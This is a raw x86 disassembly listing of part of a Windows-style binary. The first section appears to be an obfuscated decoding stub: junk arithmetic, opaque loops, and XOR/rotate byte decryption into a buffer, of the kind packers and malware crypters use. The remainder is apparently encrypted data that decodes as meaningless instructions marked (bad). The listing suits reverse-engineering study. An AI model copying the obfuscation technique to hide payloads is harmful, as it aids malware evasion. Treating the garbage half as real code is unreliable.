  4039f4:	add    DWORD PTR ds:0x428ea1,0x428e75
  4039fe:	add    DWORD PTR [ecx],0x405fcdd
  403a04:	jmp    0x403a15
  403a09:	dec    DWORD PTR ds:0x428e99
  403a0f:	add    DWORD PTR [ecx],0xfdaf4323
  403a15:	and    DWORD PTR ds:0x428ea5,0x0
  403a1f:	jmp    0x403a31
  403a24:	mov    ecx,DWORD PTR ds:0x428ea5
  403a2a:	inc    ecx
  403a2b:	mov    DWORD PTR ds:0x428ea5,ecx
  403a31:	cmp    DWORD PTR ds:0x428ea5,0x1a
  403a38:	jae    0x403a68
  403a3e:	cmp    DWORD PTR ds:0x428ea5,0x24
  403a45:	jle    0x403a68
  403a4b:	jmp    0x403a63
  403a50:	push   0x428124
  403a55:	push   DWORD PTR [ebp-0x24]
  403a58:	push   0x8716
  403a5d:	call   DWORD PTR ds:0x42ca60
  403a63:	jmp    0x403a24
  403a68:	mov    ecx,DWORD PTR [ebp-0x18]
  403a6b:	xor    ecx,esi
  403a6d:	adc    DWORD PTR ds:0x428e49,0xcc9
  403a77:	inc    eax
  403a78:	inc    DWORD PTR [ebp-0x14]
  403a7b:	sub    DWORD PTR ds:0x428ed1,0x428e99
  403a85:	add    ecx,edi
  403a87:	cmp    eax,ecx
  403a89:	jb     0x4039b8
  403a8f:	not    DWORD PTR ds:0x428e69
  403a95:	mov    dl,BYTE PTR [ebp-0x21]
  403a98:	add    eax,DWORD PTR ds:0x428e2d
  403a9e:	mov    eax,DWORD PTR [ebp-0x34]
  403aa1:	adc    DWORD PTR ds:0x428e91,0x428e69
  403aab:	xor    al,0xb1
  403aad:	sbb    DWORD PTR ds:0x428e49,0x428e75
  403ab7:	mov    cl,0x8
  403ab9:	sub    cl,al
  403abb:	add    dl,cl
  403abd:	sub    DWORD PTR ds:0x428ea9,ecx
  403ac3:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ac6:	sbb    DWORD PTR ds:0x428ed1,0x428e31
  403ad0:	xor    cl,0xb1
  403ad3:	xor    DWORD PTR ds:0x428ea5,0x741f
  403add:	sub    cl,0x8
  403ae0:	sub    DWORD PTR ds:0x428e39,0x428eb9
  403aea:	ror    dl,cl
  403aec:	xor    eax,eax
  403aee:	mov    eax,ds:0x4292f9
  403af3:	xor    ecx,ecx
  403af5:	add    ecx,DWORD PTR ds:0x429be5
  403afb:	sub    eax,ecx
  403afd:	imul   eax,DWORD PTR [eax+ecx*1]
  403b01:	mov    eax,DWORD PTR [ebp-0xc]
  403b04:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403b0b:	mov    DWORD PTR ds:0x428e61,0x15
  403b15:	cmp    DWORD PTR ds:0x428e61,0x0
  403b1c:	je     0x403b74
  403b22:	cmp    DWORD PTR ds:0x428e61,0x5
  403b29:	jb     0x403b74
  403b2f:	jmp    0x403b49
  403b34:	push   0x42819a
  403b39:	push   0x0
  403b3b:	push   DWORD PTR [ebp-0x18]
  403b3e:	push   0x1deb
  403b43:	call   DWORD PTR ds:0x42ca64
  403b49:	cmp    DWORD PTR ds:0x428e61,0x6
  403b50:	jne    0x403b61
  403b56:	mov    eax,ds:0x428e61
  403b5b:	dec    eax
  403b5c:	mov    ds:0x428e61,eax
  403b61:	xor    eax,eax
  403b63:	xor    eax,DWORD PTR ds:0x428e61
  403b69:	dec    eax
  403b6a:	mov    ds:0x428e61,eax
  403b6f:	jmp    0x403b15
  403b74:	mov    eax,DWORD PTR [ebp-0xc]
  403b77:	mov    ecx,DWORD PTR [ebp-0x28]
  403b7a:	sub    eax,edi
  403b7c:	xor    eax,esi
  403b7e:	cmp    eax,ecx
  403b80:	jne    0x403baa
  403b86:	mov    eax,DWORD PTR [ebp-0x8]
  403b89:	mov    ecx,DWORD PTR [ebp-0x10]
  403b8c:	xor    eax,esi
  403b8e:	xor    ecx,esi
  403b90:	sub    eax,ecx
  403b92:	sub    eax,edi
  403b94:	xor    eax,esi
  403b96:	mov    DWORD PTR [ebp-0x8],eax
  403b99:	mov    eax,DWORD PTR [ebp-0x10]
  403b9c:	xor    eax,esi
  403b9e:	mov    ecx,0xffcd8d88
  403ba3:	sub    ecx,eax
  403ba5:	jmp    0x403bb9
  403baa:	mov    eax,DWORD PTR [ebp-0x10]
  403bad:	xor    eax,esi
  403baf:	mov    ecx,0xffcd8d08
  403bb4:	sub    ecx,eax
  403bb6:	add    ecx,DWORD PTR [ebp-0xc]
  403bb9:	mov    DWORD PTR [ebp-0xc],ecx
  403bbc:	mov    eax,DWORD PTR [ebp-0x8]
  403bbf:	cmp    eax,0xf89c85b9
  403bc4:	jne    0x4038a1
  403bca:	mov    DWORD PTR [ebp-0x34],0x9
  403bd1:	mov    ecx,DWORD PTR [ebp+0x8]
  403bd4:	xor    ecx,esi
  403bd6:	add    ecx,edi
  403bd8:	jmp    0x4084e6
  403bdd:	lea    eax,[ecx+ebx*1]
  403be0:	mov    DWORD PTR [ebp-0x2c],eax
  403be3:	mov    eax,DWORD PTR [ebp-0x58]
  403be6:	sub    eax,ecx
  403be8:	mov    DWORD PTR [ebp-0x1c],eax
  403beb:	mov    eax,DWORD PTR [ebp-0x1c]
  403bee:	mov    DWORD PTR [ebp-0x14],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x2c]
  403bf4:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  403bfb:	mov    DWORD PTR [ebp-0x54],eax
  403bfe:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  403c05:	mov    eax,DWORD PTR [ebp-0x38]
  403c08:	xor    eax,esi
  403c0a:	add    eax,edi
  403c0c:	mov    DWORD PTR [ebp-0x10],eax
  403c0f:	mov    eax,DWORD PTR [ebp-0x38]
  403c12:	xor    eax,esi
  403c14:	add    eax,edi
  403c16:	mov    DWORD PTR [ebp-0x8],eax
  403c19:	mov    DWORD PTR [ebp-0x2c],0xf89c8599
  403c20:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c27:	mov    eax,DWORD PTR [ebp-0x38]
  403c2a:	mov    edx,DWORD PTR [ebp-0x14]
  403c2d:	xor    eax,esi
  403c2f:	add    eax,edi
  403c31:	cmp    edx,eax
  403c33:	je     0x4084da
  403c39:	mov    eax,DWORD PTR [ebp-0x20]
  403c3c:	xor    eax,esi
  403c3e:	mov    edx,0xffcd8d08
  403c43:	sub    edx,eax
  403c45:	add    edx,DWORD PTR [ebp-0x14]
  403c48:	mov    eax,DWORD PTR [ebp-0x20]
  403c4b:	mov    ebx,DWORD PTR [ebp-0x10]
  403c4e:	xor    eax,esi
  403c50:	add    eax,edi
  403c52:	imul   eax,ebx
  403c55:	cmp    eax,edx
  403c57:	ja     0x4084d7
  403c5d:	mov    edx,DWORD PTR [ebp-0x10]
  403c60:	mov    eax,DWORD PTR [ebp-0x14]
  403c63:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c66:	sub    eax,edx
  403c68:	xor    ebx,esi
  403c6a:	xor    edx,edx
  403c6c:	add    ebx,edi
  403c6e:	div    ebx
  403c70:	mov    DWORD PTR [ebp-0x8],eax
  403c73:	mov    eax,DWORD PTR [ebp-0x44]
  403c76:	mov    edx,DWORD PTR [ebp-0x8]
  403c79:	xor    eax,esi
  403c7b:	add    eax,edi
  403c7d:	cmp    edx,eax
  403c7f:	jbe    0x403c8f
  403c85:	mov    eax,DWORD PTR [ebp-0x44]
  403c88:	xor    eax,esi
  403c8a:	add    eax,edi
  403c8c:	mov    DWORD PTR [ebp-0x8],eax
  403c8f:	mov    eax,DWORD PTR [ebp-0x2c]
  403c92:	mov    edx,DWORD PTR [ebp-0x8]
  403c95:	xor    eax,esi
  403c97:	add    eax,edi
  403c99:	imul   eax,edx
  403c9c:	mov    DWORD PTR [ebp-0x8],eax
  403c9f:	mov    eax,DWORD PTR [ebp-0x38]
  403ca2:	mov    edx,DWORD PTR [ebp-0x8]
  403ca5:	xor    eax,esi
  403ca7:	add    eax,edi
  403ca9:	cmp    edx,eax
  403cab:	je     0x4084c0
  403cb1:	mov    eax,DWORD PTR [ebp-0x8]
  403cb4:	mov    DWORD PTR [ebp-0x18],eax
  403cb7:	mov    eax,DWORD PTR [ebp-0x10]
  403cba:	add    eax,DWORD PTR [ebp-0x54]
  403cbd:	mov    DWORD PTR [ebp-0x1c],0xf89c85b9
  403cc4:	mov    DWORD PTR [ebp-0x8],eax
  403cc7:	mov    eax,0xf89c85b8
  403ccc:	mov    DWORD PTR [ebp-0x28],eax
  403ccf:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  403cd6:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  403cdd:	mov    DWORD PTR [ebp-0x30],eax
  403ce0:	mov    eax,DWORD PTR [ebp-0x1c]
  403ce3:	xor    eax,esi
  403ce5:	add    eax,edi
  403ce7:	jmp    0x40847c
  403cec:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  403cf3:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  403cfa:	mov    eax,DWORD PTR [ebp-0x30]
  403cfd:	mov    edx,DWORD PTR [ebp-0xc]
  403d00:	xor    eax,esi
  403d02:	add    eax,edi
  403d04:	imul   eax,edx
  403d07:	mov    edx,DWORD PTR [ebp-0x8]
  403d0a:	mov    al,BYTE PTR [eax+edx*1]
  403d0d:	mov    BYTE PTR [ebp-0x1],al
  403d10:	mov    eax,DWORD PTR [ebp-0x30]
  403d13:	mov    edx,DWORD PTR [ebp-0xc]
  403d16:	xor    eax,esi
  403d18:	add    eax,edi
  403d1a:	imul   eax,edx
  403d1d:	mov    edx,DWORD PTR [ebp-0x5c]
  403d20:	xor    edx,esi
  403d22:	add    eax,edx
  403d24:	mov    edx,DWORD PTR [ebp-0x8]
  403d27:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f8]
  403d2f:	mov    edx,DWORD PTR [ebp-0x4c]
  403d32:	xor    edx,esi
  403d34:	lea    eax,[edx+eax*1+0x3272f8]
  403d3b:	movzx  edx,BYTE PTR [ebp-0x1]
  403d3f:	xor    edx,eax
  403d41:	mov    BYTE PTR [ebp-0x1],dl
  403d44:	mov    al,BYTE PTR [ebp-0x1]
  403d47:	mov    edx,DWORD PTR [ebp-0x30]
  403d4a:	mov    ebx,DWORD PTR [ebp-0xc]
  403d4d:	xor    edx,esi
  403d4f:	add    edx,edi
  403d51:	imul   edx,ebx
  403d54:	mov    ebx,DWORD PTR [ebp-0x8]
  403d57:	mov    BYTE PTR [edx+ebx*1],al
  403d5a:	mov    eax,DWORD PTR [ebp-0x30]
  403d5d:	mov    edx,DWORD PTR [ebp-0xc]
  403d60:	xor    eax,esi
  403d62:	add    eax,edi
  403d64:	imul   eax,edx
  403d67:	mov    edx,DWORD PTR [ebp-0x8]
  403d6a:	mov    al,BYTE PTR [eax+edx*1]
  403d6d:	mov    BYTE PTR [ebp-0x1],al
  403d70:	mov    eax,DWORD PTR [ebp-0x30]
  403d73:	jmp    0x4060ca
  403d78:	iret   
  403d79:	xor    ebp,eax
  403d7b:	jne    0x403de2
  403d7d:	jns    0x403dee
  403d7f:	cmp    edx,edi
  403d81:	mov    ecx,0xba480752
  403d86:	adc    bl,BYTE PTR ds:0x7b7b9eb5
  403d8c:	mov    ch,0x9e
  403d8e:	jnp    0x403e0b
  403d90:	mov    cs,ecx
  403d92:	or     ecx,DWORD PTR [ebx+0x6]
  403d95:	pop    eax
  403d96:	fst    QWORD PTR [ebp+ebx*2-0x72]
  403d9a:	outs   dx,BYTE PTR ds:[esi]
  403d9b:	js     0x403e15
  403d9d:	inc    ebx
  403d9e:	xor    DWORD PTR ds:0x5b33484f,esp
  403da4:	xchg   esp,eax
  403da5:	xor    cl,dl
  403da7:	fadd   st(1),st
  403da9:	jo     0x403e0a
  403dab:	lods   al,BYTE PTR ds:[esi]
  403dac:	push   edi
  403dad:	xor    DWORD PTR [esi],0xa97da88b
  403db3:	jns    0x403e05
  403db5:	jg     0x403ddc
  403db7:	add    DWORD PTR [edi+0x7139213],ebx
  403dbd:	push   0x93190118
  403dc2:	adc    BYTE PTR [eax+ebx*4+0xb],dh
  403dc6:	mov    BYTE PTR [edx],bl
  403dc8:	jnp    0x403e19
  403dca:	(bad)  
  403dcb:	mov    dh,0xce
  403dcd:	popa   
  403dce:	mov    esp,0x2a994530
  403dd3:	scas   eax,DWORD PTR es:[edi]
  403dd4:	pop    eax
  403dd5:	je     0x403d87
  403dd7:	xchg   ecx,eax
  403dd8:	mov    cl,0xb6
  403dda:	jp     0x403d76
  403ddc:	das    
  403ddd:	fld    QWORD PTR [ebx-0x3074a4ee]
  403de3:	jns    0x403e2b
  403de5:	mov    ebp,DWORD PTR [edx]
  403de7:	call   0xaa57b502
  403dec:	jae    0x403df1
  403dee:	mov    esp,0x6c74c0ef
  403df3:	xchg   BYTE PTR [ebp+0x38],al
  403df6:	jge    0x403dbb
  403df8:	mov    edx,eax
  403dfa:	sub    BYTE PTR [edi-0x35],dh
  403dfd:	dec    ebp
  403dfe:	mov    dh,0xe8
  403e00:	iret   
  403e01:	(bad)  
  403e02:	inc    esi
  403e03:	xchg   edi,eax
  403e04:	into   
  403e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e06:	out    0xb9,eax
  403e08:	or     esi,DWORD PTR [edx]
  403e0a:	adc    DWORD PTR [edi+esi*8+0x3],0xffffffca
  403e0f:	cmp    eax,0xb09c2d74
  403e14:	data16 cli 
  403e16:	out    0x52,eax
  403e18:	ss (bad) 
  403e1a:	pusha  
  403e1b:	jns    0x403e03
  403e1d:	add    eax,0xbc5b9b5f
  403e22:	mov    ebx,0xc5018a9c
  403e27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e28:	addr16 xor al,0x9b
  403e2b:	or     esi,edi
  403e2d:	mov    eax,0xc9d8ffc8
  403e32:	lock pop ss
  403e34:	les    ecx,FWORD PTR [ebx-0x260dd22e]
  403e3a:	mov    ds:0x740d9c5a,al
  403e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e40:	sub    bl,0x51
  403e43:	inc    eax
  403e44:	or     dl,BYTE PTR [ecx-0x102ca727]
  403e4a:	(bad)  
  403e4b:	leave  
  403e4c:	stos   BYTE PTR es:[edi],al
  403e4d:	mov    dh,0xd4
  403e4f:	dec    ecx
  403e50:	pop    esi
  403e51:	nop
  403e52:	cli    
  403e53:	cmc    
  403e54:	into   
  403e55:	jns    0x403e09
  403e57:	xchg   edx,eax
  403e58:	mov    dl,0xe7
  403e5a:	outs   dx,DWORD PTR ds:[esi]
  403e5b:	mov    dl,0x20
  403e5d:	jns    0x403e76
  403e5f:	jo     0x403e64
  403e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e62:	retf   0x2de9
  403e65:	into   
  403e66:	sub    dl,BYTE PTR [eax-0x31]
  403e69:	mov    dl,BYTE PTR [edi+edx*2]
  403e6c:	and    esi,ecx
  403e6e:	popf   
  403e6f:	xor    eax,0x31229734
  403e74:	cmp    ebp,ecx
  403e76:	out    0xfc,eax
  403e78:	dec    ebx
  403e79:	popa   
  403e7a:	pop    eax
  403e7b:	cmp    BYTE PTR [ebx+0x240c09b6],cl
  403e81:	test   eax,0x2e0f06a
  403e86:	retf   
  403e87:	push   es
  403e88:	and    eax,0xca005ed9
  403e8d:	xor    eax,0xad763497
  403e92:	jns    0x403e76
  403e94:	(bad)  
  403e95:	out    0x71,eax
  403e97:	leave  
  403e98:	dec    esi
  403e99:	push   ebx
  403e9a:	cdq    
  403e9b:	ins    DWORD PTR es:[edi],dx
  403e9c:	sub    cl,BYTE PTR [eax+0xf]
  403e9f:	stos   DWORD PTR es:[edi],eax
  403ea0:	in     al,dx
  403ea1:	mov    eax,ds:0x1165fb53
  403ea6:	stos   DWORD PTR es:[edi],eax
  403ea7:	mov    eax,0x52f9033d
  403eac:	test   al,0x56
  403eae:	loopne 0x403e38
  403eb0:	jo     0x403e7c
  403eb2:	pop    ss
  403eb3:	(bad)  
  403eb4:	cmp    al,0x19
  403eb6:	fsub   QWORD PTR [ebx+0x3d]
  403eb9:	mov    eax,0x7644b205
  403ebe:	imul   esi,esi,0xa3369011
  403ec4:	in     al,0x9a
  403ec6:	and    ch,ch
  403ec8:	sbb    al,0x67
  403eca:	test   ecx,0x93cbf320
  403ed0:	push   esi
  403ed1:	js     0x403ee7
  403ed3:	pop    eax
  403ed4:	pop    ebp
  403ed5:	sub    eax,0xaee099e9
  403eda:	dec    edi
  403edb:	cli    
  403edc:	mov    al,ds:0xd0e1c6bb
  403ee1:	dec    ebx
  403ee2:	cmp    eax,0x2cf7fa2
  403ee7:	(bad)  
  403ee8:	fcomp  DWORD PTR [ecx]
  403eeb:	ins    DWORD PTR es:[edi],dx
  403eec:	loop   0x403f51
  403eee:	lods   al,BYTE PTR ds:[esi]
  403eef:	dec    esi
  403ef0:	add    ebp,DWORD PTR [esp+edi*4]
  403ef3:	clc    
  403ef4:	out    0x4a,eax
  403ef6:	fnstcw WORD PTR [ecx+ecx*2-0x725cea77]
  403efd:	sbb    al,0x33
  403eff:	stos   DWORD PTR es:[edi],eax
  403f00:	lahf   
  403f01:	push   esi
  403f02:	or     ah,BYTE PTR fs:[edi+esi*8+0x1735891d]
  403f0a:	(bad)
  403f0f:	fcom   QWORD PTR [edx+0x51]
  403f12:	add    cl,dh
  403f14:	or     al,BYTE PTR [ecx+0x571e7598]
  403f1a:	sbb    dl,BYTE PTR [ecx]
  403f1c:	aad    0xaf
  403f1e:	xchg   esi,eax
  403f1f:	arpl   WORD PTR [ebx+0x42d65f77],dx
  403f25:	push   esp
  403f26:	mov    ch,BYTE PTR [esi]
  403f28:	adc    al,0x64
  403f2a:	lods   al,BYTE PTR ds:[esi]
  403f2b:	mov    edx,0xdb2c412c
  403f30:	loope  0x403f56
  403f32:	sub    BYTE PTR [ecx+0x75f88373],ah
  403f38:	dec    esp
  403f39:	fbstp  TBYTE PTR [edx-0x62]
  403f3c:	pop    ecx
  403f3d:	add    esp,edx
  403f3f:	into   
  403f40:	xchg   ecx,eax
  403f41:	in     al,dx
  403f42:	(bad)  
  403f44:	mov    bh,0x1f
  403f46:	mov    cl,0x97
  403f48:	jmp    0x7749:0x4e5d60f3
  403f4f:	mov    ebx,0x389b4462
  403f54:	pop    ebp
  403f55:	mov    ecx,0xc5c7ad44
  403f5a:	neg    DWORD PTR [edi-0x3a4cd42c]
  403f60:	pop    ebp
  403f61:	adc    edx,DWORD PTR [ebx+ecx*1-0x426b3c8]
  403f68:	fldenv gs:[edi-0x9]
  403f6c:	(bad)  
  403f6d:	mov    esp,0xd3536135
  403f72:	retf   0xd297
  403f75:	nop
  403f76:	idiv   DWORD PTR [eax+0x20]
  403f79:	(bad)  
  403f7a:	cmc    
  403f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f7c:	lods   eax,DWORD PTR ds:[esi]
  403f7d:	retf   0xf031
  403f80:	or     al,BYTE PTR [ebp+0x71]
  403f83:	daa    
  403f84:	stc    
  403f85:	xchg   ebp,eax
  403f86:	hlt    
  403f87:	mov    dh,0x35
  403f89:	mov    WORD PTR [edi-0x429a9ca0],ds
  403f8f:	sub    ah,BYTE PTR [ebx]
  403f91:	push   0xfaf2ad56
  403f96:	xor    DWORD PTR [ebp-0x5467f7b5],edi
  403f9c:	xchg   bh,bh
  403f9e:	jns    0x403f89
  403fa0:	fwait
  403fa1:	jl     0x403fea
  403fa3:	sar    DWORD PTR [ebx-0x54602ec4],cl
  403fa9:	loop   0x403f64
  403fab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fac:	jle    0x403f94
  403fae:	out    0x9d,al
  403fb0:	inc    DWORD PTR [edi+0x155e3917]
  403fb6:	or     DWORD PTR [ebx],eax
  403fb8:	fwait
  403fb9:	adc    dh,BYTE PTR [edi+0x74d2e9cb]
  403fbf:	fiadd  DWORD PTR [ecx]
  403fc1:	das    
  403fc2:	jl     0x40403b
  403fc4:	and    ch,BYTE PTR [edi+0x1d34a776]
  403fca:	into   
  403fcb:	mov    cl,0x6e
  403fcd:	test   DWORD PTR [edx+ecx*4],ecx
  403fd0:	lods   eax,DWORD PTR ds:[esi]
  403fd1:	jne    0x403faf
  403fd3:	test   eax,0x96e16c75
  403fd8:	out    dx,al
  403fd9:	mov    bl,0x7c
  403fdb:	ins    DWORD PTR es:[edi],dx
  403fdc:	mov    ecx,0xa818d433
  403fe1:	mov    al,ds:0xd1bd7b16
  403fe6:	iret   
  403fe7:	or     DWORD PTR [edx+0x19da009c],ebp
  403fed:	cmp    ah,BYTE PTR [esi+0xe]
  403ff0:	sbb    al,0xd3
  403ff2:	out    0xef,eax
  403ff4:	test   al,0x25
  403ff6:	(bad)  
  403ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ff8:	(bad)
  403ffd:	mov    ebx,0x1e9d0f2f
  404002:	inc    edx
  404003:	pop    ecx
  404004:	mov    dh,0x1a
  404006:	mov    edx,0x702e2a7c
  40400b:	retf   
  40400c:	mov    ch,0x27
  40400e:	and    DWORD PTR [ebp+ecx*1+0x1c2a6542],ecx
  404015:	jae    0x404094
  404017:	and    DWORD PTR [edx],esi
  404019:	not    BYTE PTR [edx-0x57]
  40401c:	or     eax,0x90dd612c
  404021:	repz pop edi
  404023:	cdq    
  404024:	jge    0x403ff2
  404026:	pop    esp
  404027:	int    0xb0
  404029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40402a:	dec    esi
  40402b:	add    BYTE PTR [eax-0x65c37a82],ch
  404031:	mov    al,ds:0xe49ce4dd
  404036:	mov    dl,0x5c
  404038:	leave  
  404039:	jbe    0x404087
  40403b:	je     0x403ffc
  40403d:	das    
  40403e:	arpl   WORD PTR [esp+eax*4],di
  404041:	mov    eax,ds:0xcf510443
  404046:	sub    BYTE PTR [ebp-0x32fa6a2a],ch
  40404c:	ret    0x10c0
  40404f:	jbe    0x404091
  404051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404052:	into   
  404053:	js     0x4040b2
  404055:	in     al,0x85
  404057:	jbe    0x403ff8
  404059:	(bad)  
  40405a:	(bad)  
  40405c:	mov    al,0x83
  40405e:	in     al,0x18
  404060:	clc    
  404061:	mov    ds:0x9ebf6f5,eax
  404066:	sub    al,0xf8
  404068:	test   edx,ebx
  40406a:	and    al,0xc2
  40406c:	sahf   
  40406d:	fmul   st,st(0)
  40406f:	xor    al,0x2d
  404071:	out    0xb2,eax
  404073:	dec    ebp
  404074:	xlat   BYTE PTR ds:[ebx]
  404075:	fcom   QWORD PTR [ebx+0x7b767960]
  40407b:	pop    es
  40407c:	inc    ebx
  40407d:	lds    esp,FWORD PTR [ebx+0x1b]
  404080:	xchg   esp,eax
  404081:	jmp    0x92280f98
  404086:	aad    0x8c
  404088:	mov    ds:0x9fb77f3d,al
  40408d:	or     eax,0x2ab03be7
  404092:	cli    
  404093:	bound  esi,QWORD PTR ds:0x73397091
  404099:	cmp    al,0x9c
  40409b:	mov    ?,WORD PTR [ebx+0x24]
  40409e:	fmul   QWORD PTR [esp+esi*4-0x4c]
  4040a2:	adc    eax,0x45c85f0d
  4040a7:	dec    esp
  4040a8:	xor    dl,bl
  4040aa:	add    BYTE PTR [eax],0xfd
  4040ad:	fwait
  4040ae:	and    ch,ah
  4040b0:	jecxz  0x4040cd
  4040b2:	xor    DWORD PTR [ebp+0x7f],esi
  4040b5:	fbld   TBYTE PTR [ebx]
  4040b7:	repz test DWORD PTR [eax],esp
  4040ba:	test   al,0x2d
  4040bc:	gs dec edx
  4040be:	push   esp
  4040bf:	cmp    al,0x42
  4040c1:	sub    eax,0xf71941b6
  4040c6:	ficomp DWORD PTR [edx]
  4040c8:	add    ecx,esi
  4040ca:	mov    al,0x96
  4040cc:	pop    ebx
  4040cd:	add    BYTE PTR [edi],bh
  4040cf:	stos   BYTE PTR es:[edi],al
  4040d0:	xchg   edi,eax
  4040d1:	gs adc ecx,ebx
  4040d4:	ror    BYTE PTR [esi],1
  4040d6:	addr16 test al,0x35
  4040d9:	out    dx,al
  4040da:	mov    dh,0x5c
  4040dc:	jnp    0x4040c5
  4040de:	sti    
  4040df:	xchg   ah,ah
  4040e1:	aaa    
  4040e2:	test   DWORD PTR [ecx+eiz*1],edx
  4040e5:	test   al,0xa0
  4040e8:	enter  0x67ee,0x3a
  4040ec:	popa   
  4040ed:	pushf  
  4040ee:	nop
  4040ef:	sahf   
  4040f0:	add    eax,0x9b9f24eb
  4040f5:	mov    esp,0xce16f415
  4040fa:	mov    WORD PTR [esi+0x62],cs
  4040fd:	mov    eax,ds:0x68ad8226
  404102:	pusha  
  404103:	or     dh,BYTE PTR [edi+0x3f999ec4]
  404109:	cdq    
  40410a:	and    BYTE PTR [ecx-0x41],0xd
  40410e:	lea    ebp,[ebx+0x487df7ae]
  404114:	xchg   BYTE PTR [eax],dh
  404116:	in     al,0x50
  404118:	pop    ebx
  404119:	push   es
  40411a:	retf   0x94de
  40411d:	outs   dx,BYTE PTR ds:[esi]
  40411e:	or     eax,0x7e2e8c3c
  404123:	add    DWORD PTR [esi+0x3fe1c331],ecx
  404129:	inc    ecx
  40412a:	sub    ch,BYTE PTR [ebp-0x7bf43d3b]
  404130:	pushf  
  404131:	les    eax,FWORD PTR [ecx]
  404133:	or     DWORD PTR [edx+0x1ea7aca1],ebp
  404139:	std    
  40413a:	(bad)  
  40413b:	fnstsw WORD PTR [ebp-0x7d]
  40413e:	dec    esp
  40413f:	sub    BYTE PTR [edx-0x60],cl
  404142:	dec    esi
  404143:	inc    ecx
  404144:	or     ah,BYTE PTR [edx+0x5]
  404147:	adc    dh,BYTE PTR [esi]
  404149:	mov    DWORD PTR [ebp+0x58],ebx
  40414c:	lods   eax,DWORD PTR ds:[esi]
  40414d:	(bad)  [ebp-0x26fb9918]
  404153:	(bad)
  404156:	inc    ebx
  404157:	sub    BYTE PTR [ebx-0x4f],dh
  40415a:	out    0x91,al
  40415c:	in     eax,0x23
  40415e:	xchg   edi,eax
  40415f:	xchg   esp,eax
  404160:	daa    
  404161:	clc    
  404162:	in     al,0x41
  404164:	sub    edi,DWORD PTR [esi+0x4f]
  404167:	sub    ebp,ecx
  404169:	loope  0x404116
  40416b:	jp     0x40419a
  40416d:	not    BYTE PTR [esi]
  40416f:	sub    DWORD PTR [eax-0x6066b7b9],edx
  404175:	inc    dh
  404177:	pop    ebx
  404178:	retf   
  404179:	inc    ebp
  40417a:	sbb    BYTE PTR [eax+0x278841a8],0x8b
  404181:	das    
  404182:	sbb    ah,ch
  404184:	lea    eax,[eax]
  404186:	int3   
  404187:	ret    
  404188:	push   0x1e
  40418a:	cwde   
  40418b:	pop    ss
  40418c:	jae    0x40412d
  40418e:	inc    edx
  40418f:	rol    BYTE PTR [edi],0x59
  404192:	xchg   ebp,eax
  404193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404194:	sub    al,0xa8
  404196:	loope  0x404190
  404198:	jge    0x4041b2
  40419a:	mov    eax,0x5c2ebfb0
  40419f:	xor    BYTE PTR [eax-0x2c],ah
  4041a2:	sub    al,0x76
  4041a4:	cs and dl,ah
  4041a7:	mov    ecx,0x7b5db055
  4041ac:	jg     0x404217
  4041ae:	imul   edx,DWORD PTR [edi+0xb],0x6f
  4041b2:	call   0x6c57:0xd675b313
  4041b9:	sub    DWORD PTR [ecx+0x1076c741],edi
  4041bf:	out    0xc3,al
  4041c1:	pop    ecx
  4041c2:	fistp  QWORD PTR [edx]
  4041c4:	cmp    BYTE PTR [esi+0x28],dl
  4041c7:	push   0x7f
  4041c9:	or     ah,BYTE PTR [edx+esi*8+0x28ddc3a4]
  4041d0:	dec    esi
  4041d1:	out    dx,al
  4041d2:	ja     0x40424d
  4041d4:	pushf  
  4041d5:	in     al,dx
  4041d6:	push   0x5bb60935
  4041db:	sbb    al,0xa5
  4041dd:	push   esi
  4041de:	push   eax
  4041df:	and    dl,BYTE PTR [ebx]
  4041e1:	ret    
  4041e2:	fsub   QWORD PTR [ecx]
  4041e4:	mov    ah,0x65
  4041e6:	add    eax,0x9678b29b
  4041eb:	loopne 0x404261
  4041ed:	lock cdq 
  4041ef:	add    cl,BYTE PTR [ecx+eax*4+0x7c]
  4041f3:	scas   eax,DWORD PTR es:[edi]
  4041f4:	jbe    0x4041e0
  4041f6:	xchg   DWORD PTR [ebp-0x244e2e36],eax
  4041fc:	pop    eax
  4041fd:	adc    DWORD PTR [edi+ebx*4-0x5a],esi
  404201:	xor    dh,BYTE PTR ds:0xe4888eae
  404207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404208:	(bad)  
  40420a:	int    0xcf
  40420c:	xlat   BYTE PTR ds:[ebx]
  40420d:	pop    ebp
  40420e:	stc    
  40420f:	sbb    edx,eax
  404211:	dec    ebp
  404212:	aas    
  404213:	call   0xe28d:0x9778b8ac
  40421a:	loop   0x404205
  40421c:	out    dx,al
  40421d:	or     al,0x44
  40421f:	mov    edi,0x512543ed
  404224:	(bad)  
  404225:	mov    esp,0xbccabcc0
  40422a:	cmc    
  40422b:	ficom  WORD PTR [edi-0x31]
  40422e:	sbb    ebp,DWORD PTR [esi+0x75f9fc4]
  404234:	push   ebp
  404235:	test   ebp,ebp
  404237:	loop   0x4041f6
  404239:	push   eax
  40423a:	pop    ds
  40423b:	inc    edi
  40423c:	jle    0x404285
  40423e:	push   edx
  40423f:	add    ch,al
  404241:	hlt    
  404242:	mov    edx,0x384b67a6
  404247:	add    eax,0x8f93bec6
  40424c:	pop    es
  40424d:	in     eax,0xa0
  40424f:	shl    DWORD PTR [esi-0x2],0xcd
  404253:	inc    esi
  404254:	mov    edi,0x76a6320f
  404259:	xchg   BYTE PTR [ecx-0x63],al
